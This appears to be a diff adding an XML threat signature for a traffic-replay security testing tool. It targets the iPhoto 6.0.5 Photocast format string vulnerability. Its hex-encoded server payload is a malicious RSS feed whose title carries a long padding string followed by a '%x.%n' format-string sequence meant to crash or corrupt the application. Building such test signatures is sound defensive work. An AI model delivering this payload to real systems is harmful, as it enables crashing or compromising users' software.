@@ -1,0 +1,95 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="iPhoto Photocast XML Title Format String Vulnerability"/>
+    <EngDesc display="true" value="This threat sends a maliciously constructed iPhoto XML feed which takes advantage of a format string vulnerability in some versions of iPhoto."/>
+    <Intent display="true">
+      <item value="Crashing"/>
+      <item value="Unauthorized_Use"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Apple"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="iPhoto"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="6.0.5"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://projects.info-pull.com/moab/"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Seth Hardy"/>
+    <ID display="true" value="7f22aeda2d64ce06725ea472d583b2c8"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="false"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="1.4"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="false"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633040418485554400"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1168616008" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="E"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="G"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="H"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+      <for index="H"/>
+    </for>
+    <for index="B">
+      <for index="E"/>
+      <for index="D"/>
+      <for index="G"/>
+      <for index="F"/>
+      <for index="H"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="64625" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E310D0A557365722D4167656E743A206950686F746F2F362E302E3520284D6163696E746F73683B20553B20505043204D6163204F5320582031302E342E383B20456E676C697368290D0A436F6E6E656374696F6E3A20636C6F73650D0A486F73743A203139322E3136382E342E31340D0A0D0A" CWR="false" ECE="false" URG="false" ACK="false" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="04" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="436F6E74656E742D747970653A20746578742F786D6C0D0A0D0A3C3F786D6C2076657273696F6E3D22312E302220656E636F64696E673D227574662D38223F3E0D0A3C7273732076657273696F6E3D22322E302220786D6C6E733A61773D22687474703A2F2F7777772E6170706C652E636F6D2F696C6966652F77616C6C706170657273223E0D0A3C6368616E6E656C3E0D0A3C7469746C653E4141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414125782E256E2E256E2E256E2E256E2E256E3C2F7469746C653E0D0A3C6974656D3E0D0A3C7469746C653E496E204772756265722057652054727573743C2F7469746C653E0D0A3C61773A696D6167653E687474703A2F2F7777772E6469676974616C6D756E6974696F6E2E636F6D2F6469676974616C5F6D756E6974696F6E735F6465746F6E61746F722E6A70670D0A3C2F61773A696D6167653E0D0A3C2F6974656D3E0D0A3C2F6368616E6E656C3E0D0A3C2F7273733E0D0A" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
